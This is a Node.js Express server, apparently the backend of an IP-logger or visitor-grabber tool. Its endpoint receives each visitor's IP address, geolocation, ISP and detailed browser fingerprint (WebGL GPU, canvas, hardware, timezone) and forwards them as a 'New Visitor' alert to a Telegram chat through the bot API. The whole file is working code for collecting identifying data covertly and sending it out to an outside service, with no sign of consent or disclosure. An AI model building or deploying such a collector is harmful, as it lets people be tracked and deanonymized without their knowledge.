const express = require('express');
const cors = require('cors');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.');
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Helper: send plain‑text message to Telegram (no Markdown, no long data)
async function sendTextMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text
            })
        });
    } catch (e) {
        console.error('sendTextMessage error:', e);
    }
}

// Build a concise message depending on what data we received
function buildMessage(ipData, fingerprint) {
    let msg = '📡 New Visitor\n\n';

    if (ipData) {
        msg += `IP: ${ipData.ip || 'N/A'}\n`;
        if (ipData.city) msg += `City: ${ipData.city}\n`;
        if (ipData.region) msg += `Region: ${ipData.region}\n`;
        if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
        if (ipData.org) msg += `ISP: ${ipData.org}\n`;
        msg += '\n';
    }

    if (fingerprint) {
        msg += 'Device:\n';
        msg += `User Agent: ${(fingerprint.userAgent || '').substring(0, 80)}\n`;
        msg += `Platform: ${fingerprint.platform}\n`;
        msg += `Screen: ${fingerprint.screen?.width}x${fingerprint.screen?.height}\n`;
        msg += `Cores: ${fingerprint.hardwareConcurrency}\n`;
        msg += `Memory: ${fingerprint.deviceMemory} GB\n`;
        msg += `Touch: ${fingerprint.maxTouchPoints}\n`;
        msg += `Timezone: ${fingerprint.timezone}\n`;
        if (fingerprint.webgl?.renderer) {
            msg += `GPU: ${fingerprint.webgl.renderer.substring(0, 60)}\n`;
        }
        msg += `Canvas: ${fingerprint.canvas ? 'captured' : 'no'}\n`;
        msg += '\n';
    }

    msg += `Time: ${new Date().toISOString()}`;

    // Hard limit to 4000 characters (Telegram max = 4096)
    if (msg.length > 4000) {
        msg = msg.substring(0, 3997) + '...';
    }
    return msg;
}

// Main endpoint – accepts both immediate IP ping and full fingerprint data
app.post('/api/telegram', async (req, res) => {
    try {
        const { ipData, fingerprint, timestamp } = req.body;

        console.log(`[+] Received at ${timestamp}`);
        console.log(`[+] IP: ${ipData?.ip}`);

        const message = buildMessage(ipData, fingerprint || null);
        await sendTextMessage(message);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Backend running on port ${PORT}`);
});
